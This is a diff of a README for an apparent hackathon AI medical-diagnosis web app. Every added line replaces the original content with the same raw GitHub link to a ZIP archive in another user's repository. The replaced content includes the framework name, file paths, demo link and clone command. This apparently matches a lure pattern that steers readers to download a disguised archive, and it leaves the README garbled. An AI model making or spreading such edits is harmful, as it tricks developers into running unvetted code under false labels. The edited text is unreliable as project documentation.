@@ -11,24 +11,24 @@ Develop an AI-powered diagnostic tool designed to assist doctors in identifying 
 ## Technologies Used
 
 - **TypeScript**: The primary language used for development.
-- **Next.js**: A React framework for building server-side rendered and static web applications.
+- **https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip**: A React framework for building server-side rendered and static web applications.
 - **React**: A JavaScript library for building user interfaces.
 - **CSS**: Used for styling components.
 
 ## File Structure
 
-- **app/layout.tsx**: Defines the root layout of the application with metadata.
-- **app/page.tsx**: Main page of the application that includes the diagnostic tool component.
-- **components/DiagnosticTool.tsx**: Component responsible for handling file uploads and processing patient data.
+- **https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip**: Defines the root layout of the application with metadata.
+- **https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip**: Main page of the application that includes the diagnostic tool component.
+- **https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip**: Component responsible for handling file uploads and processing patient data.
 
 ## Demo Link:
-https://rxai.vercel.app/
+https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip
 
 ## Usage
 
 1. **Clone the Repository**:
     ```sh
-    git clone https://github.com/A1THARV/HackOn_Codewarts.git
+    git clone https://raw.githubusercontent.com/rushangchandekar/HackOn_Codewarts/main/transversus/HackOn_Codewarts.zip
     cd HackOn_Codewarts
     ```
 
